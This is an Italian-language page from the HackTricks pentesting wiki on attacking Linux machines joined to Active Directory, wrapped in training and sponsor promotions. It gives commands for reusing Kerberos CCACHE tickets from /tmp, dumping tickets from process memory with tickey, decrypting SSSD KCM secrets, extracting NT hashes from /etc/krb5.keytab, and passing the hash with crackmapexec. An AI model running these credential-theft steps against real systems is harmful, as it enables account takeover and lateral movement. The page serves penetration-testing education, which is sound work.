# Linux Active Directory

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

Una macchina linux può essere presente anche all'interno di un ambiente Active Directory.

Una macchina linux in un AD potrebbe **memorizzare diversi ticket CCACHE all'interno di file. Questi ticket possono essere utilizzati e abusati come qualsiasi altro ticket kerberos**. Per leggere questi ticket è necessario essere l'utente proprietario del ticket o **root** all'interno della macchina.

## Enumerazione

### Enumerazione AD da linux

Se hai accesso a un AD in linux (o bash in Windows) puoi provare [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) per enumerare l'AD.

Puoi anche controllare la seguente pagina per apprendere **altri modi per enumerare l'AD da linux**:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPA è un **alternativa** open-source a Microsoft Windows **Active Directory**, principalmente per ambienti **Unix**. Combina un **directory LDAP** completo con un MIT **Kerberos** Key Distribution Center per una gestione simile a Active Directory. Utilizzando il Dogtag **Certificate System** per la gestione dei certificati CA e RA, supporta l'autenticazione **multi-fattore**, inclusi i smartcard. SSSD è integrato per i processi di autenticazione Unix. Scopri di più su di esso in:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## Giocare con i ticket

### Pass The Ticket

In questa pagina troverai diversi luoghi dove potresti **trovare ticket kerberos all'interno di un host linux**, nella pagina seguente puoi apprendere come trasformare questi formati di ticket CCache in Kirbi (il formato che devi usare in Windows) e anche come eseguire un attacco PTT:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### Riutilizzo del ticket CCACHE da /tmp

I file CCACHE sono formati binari per **memorizzare le credenziali Kerberos** e sono tipicamente memorizzati con permessi 600 in `/tmp`. Questi file possono essere identificati dal loro **formato di nome, `krb5cc_%{uid}`,** correlato all'UID dell'utente. Per la verifica del ticket di autenticazione, la **variabile di ambiente `KRB5CCNAME`** dovrebbe essere impostata sul percorso del file ticket desiderato, consentendone il riutilizzo.

Elenca il ticket attualmente utilizzato per l'autenticazione con `env | grep KRB5CCNAME`. Il formato è portabile e il ticket può essere **riutilizzato impostando la variabile di ambiente** con `export KRB5CCNAME=/tmp/ticket.ccache`. Il formato del nome del ticket Kerberos è `krb5cc_%{uid}` dove uid è l'UID dell'utente.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### Riutilizzo del ticket CCACHE dalla keyring

**I ticket Kerberos memorizzati nella memoria di un processo possono essere estratti**, in particolare quando la protezione ptrace della macchina è disabilitata (`/proc/sys/kernel/yama/ptrace_scope`). Uno strumento utile per questo scopo si trova su [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), che facilita l'estrazione iniettando nelle sessioni e dumpando i ticket in `/tmp`.

Per configurare e utilizzare questo strumento, si seguono i seguenti passaggi:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Questa procedura tenterà di iniettare in varie sessioni, indicando il successo memorizzando i ticket estratti in `/tmp` con una convenzione di denominazione di `__krb_UID.ccache`.


### Riutilizzo del ticket CCACHE da SSSD KCM

SSSD mantiene una copia del database nel percorso `/var/lib/sss/secrets/secrets.ldb`. La chiave corrispondente è memorizzata come file nascosto nel percorso `/var/lib/sss/secrets/.secrets.mkey`. Per impostazione predefinita, la chiave è leggibile solo se si dispone di permessi **root**.

Invocando \*\*`SSSDKCMExtractor` \*\* con i parametri --database e --key si analizzerà il database e si **decrypteranno i segreti**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Il **blob della cache delle credenziali Kerberos può essere convertito in un file CCache Kerberos utilizzabile** che può essere passato a Mimikatz/Rubeus.

### Riutilizzo del ticket CCACHE da keytab
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### Estrai account da /etc/krb5.keytab

Le chiavi degli account di servizio, essenziali per i servizi che operano con privilegi di root, sono archiviate in modo sicuro nei file **`/etc/krb5.keytab`**. Queste chiavi, simili a password per i servizi, richiedono una stretta riservatezza.

Per ispezionare il contenuto del file keytab, si può utilizzare **`klist`**. Lo strumento è progettato per visualizzare i dettagli delle chiavi, inclusa l'**NT Hash** per l'autenticazione degli utenti, in particolare quando il tipo di chiave è identificato come 23.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Per gli utenti Linux, **`KeyTabExtract`** offre funzionalità per estrarre l'hash RC4 HMAC, che può essere sfruttato per il riutilizzo dell'hash NTLM.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Su macOS, **`bifrost`** funge da strumento per l'analisi dei file keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Utilizzando le informazioni sull'account e sull'hash estratte, è possibile stabilire connessioni ai server utilizzando strumenti come **`crackmapexec`**.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## Riferimenti
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<figure><img src="/..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Impara e pratica Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.

</details>
{% endhint %}
